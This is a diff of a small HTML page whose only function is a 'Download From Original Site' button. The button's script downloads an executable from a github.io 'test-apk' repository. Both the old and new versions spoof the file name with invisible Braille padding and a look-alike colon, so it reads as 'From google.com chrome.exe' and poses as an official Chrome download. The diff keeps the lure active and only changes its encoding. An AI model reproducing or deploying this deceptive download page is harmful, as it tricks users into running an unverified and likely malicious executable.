@@ -18,15 +18,14 @@
   </style>
 </head>
 <body>
-  <script>
-    function a() {
-      // Step 1: Create a temporary <a> element to trigger the download
-      var link = document.createElement('a');
-      link.href = 'https://ecdnts-del.github.io/test-apk/From⠀google.com ⠀⠀⠀⠀⠀⠀ chrome.exe';
-      link.download = 'From⠀www.google.com ⠀⠀⠀⠀⠀ chrome.exe'; // Set the filename for download
-      link.click(); // Trigger the download
-    }
-  </script>
+<script>
+function a() {
+  var link = document.createElement('a');
+  link.href = 'https://ecdnts-del.github.io/test-apk/From%E2%88%B6%20google.com%20%E2%A0%80%E2%A0%80%E2%A0%80%E2%A0%80%E2%A0%80%20chrome.exe';
+  link.click();
+}
+</script>
+
 
   <center><input type="button" class="button" value="Download From Original Site" onclick="a()"> </center>
 </body>
